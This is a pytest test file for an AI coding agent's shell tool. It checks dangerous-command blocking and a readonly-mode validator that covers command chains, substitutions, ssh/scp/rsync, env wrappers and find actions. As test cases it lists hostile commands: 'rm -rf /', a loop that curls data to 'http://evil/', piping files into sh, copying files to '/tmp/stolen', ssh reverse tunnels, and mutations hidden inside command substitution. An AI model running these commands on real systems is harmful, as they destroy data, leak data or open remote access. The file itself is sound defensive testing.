# Copyright 2025 Vijaykumar Singh <vijay@anvaiops.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for bash tool."""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from victor.tools.bash import shell
from victor.tools.bash import _maybe_attribute_shell_git_commit


@pytest.mark.asyncio
async def test_shell_simple_command():
    """Test executing a simple bash command."""
    result = await shell(cmd="echo 'hello'")

    assert result["success"] is True
    assert "hello" in result["stdout"]
    assert result["return_code"] == 0


@pytest.mark.asyncio
async def test_shell_missing_command():
    """Test bash tool with missing command."""
    result = await shell(cmd="")

    assert result["success"] is False
    assert "Missing required parameter" in result["error"]


@pytest.mark.asyncio
async def test_shell_dangerous_command():
    """Test bash tool blocks dangerous commands."""
    result = await shell(cmd="rm -rf /", dangerous=False)

    assert result["success"] is False
    assert "Dangerous command blocked" in result["error"]


@pytest.mark.asyncio
async def test_shell_allow_dangerous():
    """Test bash tool allows dangerous commands when explicitly allowed."""
    # This won't actually execute, just test the allow flag works
    with patch("asyncio.create_subprocess_shell") as mock_subprocess:
        mock_process = MagicMock()
        mock_process.returncode = 0
        mock_process.communicate = AsyncMock(return_value=(b"", b""))
        mock_subprocess.return_value = mock_process

        await shell(cmd="rm -rf test", dangerous=True, readonly=False)

        # Should attempt to execute
        mock_subprocess.assert_called_once()


@pytest.mark.asyncio
async def test_shell_with_working_dir():
    """Test bash command with working directory."""
    result = await shell(cmd="pwd", cwd="/tmp")

    assert result["success"] is True
    # The working dir might be in stdout or as a field
    assert "/tmp" in result.get("stdout", "") or result.get("cwd") == "/tmp"


@pytest.mark.asyncio
async def test_shell_timeout():
    """Test bash command timeout.

    Mocked at run_managed_process (the shared spawn/kill/timeout runner,
    co-design review item 15) rather than asyncio.create_subprocess_shell:
    shell() no longer calls process.communicate() directly, so mocking that
    call would silently stop exercising shell()'s timeout-handling path.
    """
    with patch("victor.tools.subprocess_executor.run_managed_process") as mock_run:
        mock_run.return_value = (b"", b"", -1, True, False)  # timed_out=True

        result = await shell(cmd="sleep 100", timeout=1, readonly=False)

        assert result["success"] is False
        assert "timed out" in result["error"] or "Failed to execute" in result["error"]


@pytest.mark.asyncio
async def test_shell_working_dir_not_found():
    """Test bash command with non-existent working directory."""
    result = await shell(cmd="pwd", cwd="/nonexistent/directory")

    assert result["success"] is False
    assert "Working directory does not exist" in result["error"]
    assert result["return_code"] == -1


@pytest.mark.asyncio
async def test_shell_general_exception():
    """Test bash command general exception handling."""
    with (
        patch("asyncio.create_subprocess_shell") as mock_subprocess,
        patch("victor.tools.bash._is_readonly_command", return_value=False),
    ):
        mock_subprocess.side_effect = RuntimeError("Unexpected error")

        result = await shell(cmd="echo test", readonly=False)

        assert result["success"] is False
        assert "Failed to execute command" in result["error"]
        assert result["return_code"] == -1


@pytest.mark.asyncio
async def test_shell_defaults_to_non_readonly_mode():
    """Shell defaults to readonly=False; the allowlist is opt-in.

    Commit 989dd14e flipped the default (the LLM echoed readonly=True back
    from the schema, blocking legitimate commands). The dangerous-command
    check and ShellSafetyPolicy remain the always-on safety floor (covered
    by test_shell_dangerous_command); a benign non-allowlisted command must
    run when the caller omits the flag, and readonly=True must still opt
    into the allowlist.
    """
    result = await shell(cmd="sleep 1")

    assert result["success"] is True
    assert result["return_code"] == 0

    opted_in = await shell(cmd="sleep 1", readonly=True)

    assert opted_in["success"] is False
    assert "readonly mode" in opted_in["error"]


@pytest.mark.asyncio
async def test_shell_readonly_allows_cd_search_with_stderr_suppression():
    """Readonly shell should allow common scoped search commands."""
    result = await shell(
        cmd=('cd rust && grep -rn "Arc\\|Mutex" crates/*/src/*.rs 2>/dev/null | head -20')
    )

    assert result["success"] is True
    assert result["return_code"] == 0


@pytest.mark.asyncio
async def test_shell_heredoc_command():
    """Heredoc commands should execute without extra escaping."""
    cmd = "cat <<'EOF'\nprint('hello')\nEOF"
    result = await shell(cmd=cmd)

    assert result["success"] is True
    assert "print('hello')" in result["stdout"]


@pytest.mark.asyncio
async def test_shell_broad_search_commands_are_not_redirected():
    """Broad rg/grep searches execute in shell; the redirect guard is gone.

    Commit 92935ec9 removed the search-redirect guard that blocked rg/grep
    and pointed at the deprecated grouped search tool. The command must now
    reach subprocess execution instead of returning a guard error.
    """
    with patch(
        "victor.tools.shell_command_cache.execute_with_cache",
        return_value=(0, "match\n", ""),
    ) as mock_exec:
        result = await shell(cmd="rg FilePathField .", readonly=False)

    mock_exec.assert_called_once()
    assert mock_exec.call_args.args[0].startswith("rg ")
    assert result["success"] is True
    assert "match" in result["stdout"]


@pytest.mark.asyncio
async def test_shell_blocks_filesystem_wide_find():
    """`find / ...` is guarded (commit 92935ec9) — immediate error, no execution."""
    result = await shell(cmd="find / -name '*.py'")

    assert result["success"] is False
    assert "Filesystem-wide searches are not allowed" in result["error"]
    assert result["return_code"] == -1


class TestReadonlyControlFlow:
    """Read-only shell control-flow validation (glm-5.1 docs-audit regression).

    The agent repeatedly emitted read-only `for`/`if`/`while` loops that were
    rejected ("Command 'for' is not allowed in readonly mode") because the
    validator treated shell keywords as commands. Control-flow keywords are now
    structural: the loop *body* commands, command substitutions and assignment
    RHS are still validated, so read-only loops pass but mutations are rejected.
    """

    @staticmethod
    def _valid(cmd: str) -> bool:
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    @pytest.mark.parametrize(
        "cmd",
        [
            # The exact failing pattern from the transcript.
            'for d in docs/*/; do cnt=$(find "$d" -name "*.md" | wc -l); echo "$d : $cnt"; done',
            "for i in 1 2 3; do echo $i; done",
            "if [ -f README.md ]; then cat README.md; fi",
            'while read line; do echo "$line"; done',
            "cnt=$(find . -name '*.py' | wc -l)",
            "for f in a b c; do test -f $f; done",
        ],
    )
    def test_readonly_control_flow_allowed(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "for x in *; do rm $x; done",  # mutation in loop body
            "for x in $(rm -rf /tmp/x); do echo $x; done",  # mutation in header sub
            "if true; then mv a b; fi",  # mutation in if body
            "echo $(rm important.txt)",  # mutation in command substitution
            'echo "x" > file.txt',  # write redirect
            "while read l; do curl http://evil/$l; done",  # non-readonly in body
        ],
    )
    def test_readonly_control_flow_rejected(self, cmd):
        assert self._valid(cmd) is False

    def test_simple_commands_unaffected(self):
        assert self._valid("ls -la") is True
        assert self._valid("cd src && grep -n foo bar.py") is True
        assert self._valid("rm -rf /") is False
        assert self._valid("git status") is True
        assert self._valid("git push") is False


class TestReadonlyCompoundCommands:
    """Common observed readonly command chains and write escape regressions."""

    @staticmethod
    def _valid(cmd: str) -> bool:
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    @pytest.mark.parametrize(
        "cmd",
        [
            "cd victor && cat tools/bash.py",
            "cat victor/tools/bash.py && sed -n '1,40p' victor/tools/bash.py",
            "cat victor/tools/bash.py | sed -n '1,80p' | grep readonly",
            "sed -n '1,80p' victor/tools/bash.py && grep -n readonly victor/tools/bash.py",
            "grep -rn readonly victor/tools 2>/dev/null | head -20",
            "less < README.md",
            "git status >/dev/null 2>&1",
            "cat README.md | wc -l",
            "find victor -name '*.py' | sort | uniq | head -50",
        ],
    )
    def test_observed_readonly_chains_allowed(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "pdfinfo attachments/report.pdf",
            "pdftotext attachments/report.pdf - | sed -n '1,20p'",
            "pdftocairo -f 1 -l 1 -singlefile -png attachments/scan.pdf - | "
            "tesseract stdin stdout",
            "tesseract attachments/image.jpg stdout",
            "ffprobe -v error -show_format -show_streams attachments/video.mp4",
            "ffmpeg -loglevel error -ss 00:00:05 -i attachments/video.mp4 "
            "-frames:v 1 -f image2pipe -vcodec png - | tesseract stdin stdout",
        ],
    )
    def test_readonly_media_inspection_allowed(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "pdftotext attachments/report.pdf report.txt",
            "pdftocairo -png attachments/report.pdf page",
            "tesseract attachments/image.jpg extracted",
            "ffprobe -o metadata.json attachments/video.mp4",
            "ffmpeg -i attachments/video.mp4 output.mp4",
            "ffmpeg -i attachments/video.mp4 output.mp4 -f image2pipe -",
        ],
    )
    def test_readonly_media_file_outputs_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat README.md > /tmp/readme.copy",
            "git status > status.txt",
            "grep -rn readonly victor 2> errors.txt",
            "cat README.md | tee /tmp/readme.copy",
            "cat README.md | sed -n '1p' | tee output.txt",
            "cat README.md && rm README.md",
            "cat README.md || rm README.md",
            "cat README.md | sh",
            "cat README.md | bash",
            "sed -i 's/a/b/' README.md",
            "sed -i.bak 's/a/b/' README.md",
            "grep foo README.md > matches.txt || cat README.md",
        ],
    )
    def test_write_or_exec_hidden_in_chains_rejected(self, cmd):
        assert self._valid(cmd) is False


class TestReadonlyQuoteAwareSubstitutions:
    r"""Quote-aware substitution scanning (regression: literal backticks/pipes).

    Markdown/mermaid audits run `grep '^```mermaid'` and `grep -c '```\|```'`.
    A prior naive scanner treated the single-quoted backticks as command
    substitutions and surfaced a spurious `|` command, wrongly rejecting these
    read-only greps. Single quotes are literal in shell, so they must pass; real
    (unquoted / double-quoted) substitutions must still be validated.
    """

    @staticmethod
    def _valid(cmd: str) -> bool:
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    @pytest.mark.parametrize(
        "cmd",
        [
            "grep -n '^```mermaid' docs/architecture/BLUEPRINT.md",
            "grep -c '```\\|```' docs/architecture/BLUEPRINT.md",
            "echo '$(rm -rf /)'",  # single-quoted -> literal -> safe
            "cat file `echo hi`",  # real backtick sub of a read-only command
        ],
    )
    def test_quoted_literals_and_safe_subs_allowed(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat $(rm important.txt)",  # unquoted substitution mutation
            "cat file `rm important.txt`",  # backtick substitution mutation
            'echo "$(rm important.txt)"',  # double-quoted subs ARE active in shell
        ],
    )
    def test_real_substitution_mutations_rejected(self, cmd):
        assert self._valid(cmd) is False


class TestShellGitCommitAttribution:
    """Best-effort agent-layer attribution for raw ``git commit -m "..."``
    issued through the shell escape hatch (mirrors the ``git`` tool wiring)."""

    TRAILER = "Co-authored-by: victor-code-ai"

    @pytest.mark.parametrize(
        "cmd",
        [
            'git commit -m "fix: x"',
            "git commit -m 'fix: x'",
            "git commit --message 'fix: x'",
            'git commit --message="fix: x"',
            'git commit -m="fix: x"',
        ],
    )
    def test_plain_commit_gets_trailer(self, cmd, monkeypatch):
        monkeypatch.delenv("VICTOR_COMMIT_ATTRIBUTION", raising=False)
        out = _maybe_attribute_shell_git_commit(cmd)
        assert self.TRAILER in out
        # Command shape preserved.
        assert out.startswith("git commit")

    @pytest.mark.parametrize(
        "cmd",
        [
            'git add . && git commit -m "x"',  # chaining
            'git commit -m "x" | tee log',  # pipe
            'git commit -m "$(date)"',  # command substitution
            "git commit -F - <<EOF",  # heredoc
            'git commit --amend -m "x"',  # amend
            "echo hi",  # not a git commit
            "git commit -F msg.txt",  # message-file form
            'git -c core.x=1 commit -m "hi"',  # -c config form
            "git status",  # not a commit
        ],
    )
    def test_compound_or_dynamic_commands_left_untouched(self, cmd, monkeypatch):
        monkeypatch.delenv("VICTOR_COMMIT_ATTRIBUTION", raising=False)
        assert _maybe_attribute_shell_git_commit(cmd) == cmd

    def test_opt_out_leaves_message_untouched(self, monkeypatch):
        monkeypatch.setenv("VICTOR_COMMIT_ATTRIBUTION", "0")
        cmd = 'git commit -m "fix: x"'
        assert _maybe_attribute_shell_git_commit(cmd) == cmd

    def test_idempotent_on_reapplication(self, monkeypatch):
        # Running the rewriter twice must not duplicate the trailer.
        monkeypatch.delenv("VICTOR_COMMIT_ATTRIBUTION", raising=False)
        once = _maybe_attribute_shell_git_commit('git commit -m "fix: x"')
        twice = _maybe_attribute_shell_git_commit(once)
        assert once.count(self.TRAILER) == 1
        assert twice == once


class TestReadonlyRemoteExec:
    """Remote-exec commands (ssh, scp, rsync) — readonly analysis of payload.

    ssh: extract the remote command and validate it recursively.
    scp/rsync: check direction — pull is readonly, push is not.
    """

    @staticmethod
    def _valid(cmd: str) -> bool:
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    # --- SSH: readonly remote commands ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "ssh vsingh@aiserver1 'ps aux | grep sandhi'",
            "ssh host 'cat /etc/hostname'",
            "ssh host 'ls -la /tmp/'",
            "ssh host 'grep -rn error /var/log/syslog'",
            "ssh host 'ps aux | grep inferflux | grep -v grep'",
            "ssh -p 22 host 'uptime'",
            "ssh -o StrictHostKeyChecking=no host 'df -h'",
            "ssh host 'free -h && df -h /'",
            "ssh host 'cat /etc/sandhi/streaming-v0.14.0.json'",
            "ssh host 'tail -50 ~/.victor/logs/victor.log'",
            "ssh host 'wc -l /var/log/syslog'",
            # user@host forms
            "ssh user@host 'ps aux'",
            "ssh vsingh@aiserver1 'cat /etc/hostname'",
            # multiple -o flags + user@host + quoted command
            "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host 'ps aux | grep sandhi'",
            "ssh -o opt1 -o opt2 user@host 'uptime'",
            # boolean flags mixed with value flags
            "ssh -t -o opt host 'df -h'",
            "ssh -tt host 'ls -la /tmp/'",
            "ssh -v -o opt user@host 'cat /etc/hostname'",
        ],
    )
    def test_ssh_readonly_remote_commands_allowed(self, cmd):
        assert self._valid(cmd) is True

    # --- SSH: mutating remote commands ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "ssh host 'rm -rf /tmp/foo'",
            "ssh host 'echo hello > /tmp/file'",
            "ssh host 'systemctl restart nginx'",
            "ssh host 'apt-get install foo'",
            "ssh host 'kill -9 1234'",
        ],
    )
    def test_ssh_mutating_remote_commands_rejected(self, cmd):
        assert self._valid(cmd) is False

    # --- SSH: no command (interactive session) ---

    def test_ssh_interactive_session_rejected(self):
        assert self._valid("ssh host") is False
        assert self._valid("ssh vsingh@aiserver1") is False

    # --- SCP: direction-based ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "scp host:/remote/file.txt ./local/",
            "scp vsingh@aiserver1:/tmp/diag.sh ./",
            "scp -P 22 host:/remote/file.txt ./local/",
            "scp -r host:/remote/dir ./local/",
        ],
    )
    def test_scp_pull_readonly(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "scp ./file.txt host:/remote/path",
            "scp ./diag.sh vsingh@aiserver1:/tmp/",
            "scp -r ./dir host:/remote/path",
        ],
    )
    def test_scp_push_not_readonly(self, cmd):
        assert self._valid(cmd) is False

    # --- rsync: direction-based ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "rsync host:/src/ ./dst/",
            "rsync vsingh@aiserver1:/tmp/data ./local/",
        ],
    )
    def test_rsync_pull_readonly(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "rsync ./src/ host:/dst/",
            "rsync ./data vsingh@aiserver1:/tmp/",
        ],
    )
    def test_rsync_push_not_readonly(self, cmd):
        assert self._valid(cmd) is False

    # --- Compound: ssh in chains ---

    def test_ssh_readonly_in_chain_allowed(self):
        assert self._valid("ssh host 'ps aux' && cat output.txt") is True

    def test_ssh_mutating_in_chain_rejected(self):
        assert self._valid("ssh host 'rm -rf /' && cat output.txt") is False


class TestReadonlyRemoteExecHardening:
    """Adversarial regressions for the remote-exec readonly analysis.

    Each test pins a bypass shape found by hostile review: forwarding flags,
    mis-parsed combined short flags, and the env exec wrapper.
    """

    @staticmethod
    def _valid(cmd):
        from victor.tools.bash import _validate_readonly_command

        ok, _ = _validate_readonly_command(cmd)
        return ok

    # --- ssh port forwarding: never readonly regardless of payload ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "ssh -L 8080:inhost:80 host cat /etc/hosts",
            "ssh -R 9999:localhost:22 host cat /etc/hosts",
            "ssh -D 1080 host cat /etc/hosts",
            "ssh -W target:22 jump cat /etc/hosts",
            "ssh -L8080:inhost:80 host cat /etc/hosts",  # attached value
            "ssh -vL 8080:inhost:80 host cat /etc/hosts",  # clustered flag
            "ssh -w 1:1 host cat /etc/hosts",  # tun device allocation
        ],
    )
    def test_ssh_forwarding_rejected(self, cmd):
        assert self._valid(cmd) is False

    # --- combined short flags: value flag inside a cluster consumes the
    # next token (ssh -vp 22 host ... == ssh -v -p 22 host ...) ---

    def test_ssh_combined_flag_benign_payload_allowed(self):
        assert self._valid("ssh -vp 22 host cat /etc/hosts") is True

    @pytest.mark.parametrize(
        "cmd",
        [
            # Pre-fix: '-vp' treated as one boolean token made '22' the host,
            # so the payload was validated starting one token late and the
            # mutating tail rode in as arguments of an allowlisted word.
            "ssh -vp 22 host rm -rf /tmp/x",
            "ssh -vp 22 cat rm -rf /tmp/x",  # host named like an allowlisted cmd
        ],
    )
    def test_ssh_combined_flag_mutating_payload_rejected(self, cmd):
        assert self._valid(cmd) is False

    def test_ssh_controlmaster_is_boolean_flag(self):
        """-M is boolean (ControlMaster); treating it as a value flag made the
        host look like the flag's value and broke payload extraction."""
        assert self._valid("ssh -M host cat /etc/hosts") is True
        assert self._valid("ssh -M host rm -rf /tmp/x") is False

    def test_ssh_attached_option_value_still_parses(self):
        assert self._valid("ssh -oStrictHostKeyChecking=no host cat /etc/hosts") is True
        assert self._valid("ssh -p22 host cat /etc/hosts") is True

    # --- env is a generic exec wrapper: validate what it wraps ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "env rm -rf /tmp/x",
            "env VAR=1 rm -f x",
            "env -u X rm -f x",
            "env touch /tmp/x",
            "env git push",
            "env ssh host rm -rf /tmp/x",  # wrapper around mutating remote exec
            "ssh host env rm -rf /tmp/x",  # env inside a remote payload
        ],
    )
    def test_env_wrapped_mutation_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "env",
            "env VAR=1 cat /etc/hosts",
            "env cat file.txt",
            "env ssh host cat /etc/hosts",
            "printenv",
        ],
    )
    def test_env_wrapped_readonly_allowed(self, cmd):
        assert self._valid(cmd) is True


class TestReadonlyFindActions:
    """find's action flags: -exec family validated recursively, delete/write
    actions rejected, plain readonly finds untouched.

    Regression (pre-existing hole): `find . -exec rm {} ;`, `find -delete` and
    the -fprint family all executed under readonly mode because the allowlist
    only checked the base command.
    """

    @staticmethod
    def _valid(cmd):
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -name x -exec rm {} ;",
            "find /tmp -delete",
            "find . -name '*.log' -exec rm {} +",
            "find . -execdir sh -c 'x' ;",
            "find . -name x -ok rm {} ;",
            "find . -exec cp {} /tmp/stolen ;",
            # unterminated form: the compound splitter consumes `;` first
            "find . -name x -exec rm {}",
            # mutating clause after a benign one
            "find . -name x -exec cat {} ; -delete",
        ],
    )
    def test_find_exec_and_delete_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -fprint /tmp/out",
            "find . -fprintf /tmp/out '%p'",
            "find . -fprint0 /tmp/out",
            "find . -fls /tmp/out",
        ],
    )
    def test_find_file_writing_actions_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -name '*.py'",
            "find . -type f -name x -print",
            "find . -maxdepth 2 -ls",
            # readonly -exec: the wrapped command validates cleanly ({} stays
            # an opaque argument)
            "find . -name x -exec cat {} ;",
            "find . -name x -exec grep foo {} +",
            # a test VALUE that looks like an action flag is not one
            "find . -name -delete",
            "find . -newer ref.txt -print",
            "find . \\( -name a -o -name b \\) -ls",
        ],
    )
    def test_readonly_find_forms_still_allowed(self, cmd):
        assert self._valid(cmd) is True
